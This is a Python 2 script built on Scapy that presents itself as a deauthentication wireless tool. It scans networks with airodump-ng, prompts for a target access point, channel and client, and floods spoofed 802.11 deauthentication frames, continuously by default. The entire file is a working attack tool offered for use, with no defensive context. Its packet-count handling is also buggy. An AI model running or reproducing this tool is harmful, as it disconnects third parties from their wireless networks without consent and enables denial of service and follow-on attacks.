import argparse
from multiprocessing import Process
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import signal
import threading

def perform_deauth(bssid, client, count):
    pckt = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
    cli_to_ap_pckt = None
    if client != 'FF:FF:FF:FF:FF:FF' : cli_to_ap_pckt = Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth()
    print 'Sending Deauth to ' + client + ' from ' + bssid
    if not count: print 'Press CTRL+C to quit'
    # We will do like aireplay does and send the packets in bursts of 64, then sleep for half a sec or so
    while count != 0:
        try:
            for i in range(64):
                # Send out deauth from the AP
                send(pckt)
                # If we're targeting a client, we will also spoof deauth from the client to the AP
                if client != 'FF:FF:FF:FF:FF:FF': send(cli_to_ap_pckt)
            # If count was -1, this will be an infinite loop
            count -= 1
        except KeyboardInterrupt:
            break

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='reply.py - Deauthentication wireless tool with Scapy python module (by SIDNEY RDC)')
    parser.add_argument('-i', '--interface', dest='interface', type=str, required=True, help='Interface to use for sniffing and packet injection')
    args = parser.parse_args()

    # Monioring the wifi networks
    os.system("airodump-ng %s" % (args.interface))

    # Set the BSSID mac address and channel
    target_bssid = raw_input('Enter a BSSID to perform an deauth attack: ')
    target_ch = raw_input('Enter with the channel of the network: ')

    # Get our interface to the correct channel
    print 'Changing ' + args.interface + ' to channel ' + target_ch
    os.system("iwconfig %s channel %s" % (args.interface, target_ch))
    
    # Now we have a bssid that we have detected, let's get the client MAC
    target_client = raw_input('Enter a client MAC address (Default: FF:FF:FF:FF:FF:FF): ')
    if not target_client: target_client = 'FF:FF:FF:FF:FF:FF'
    deauth_pckt_count = raw_input('Number of deauth packets (Default: -1 [constant]): ')
    if not deauth_pckt_count: deauth_pckt_count = -1
    perform_deauth(target_bssid, target_client, deauth_pckt_count)

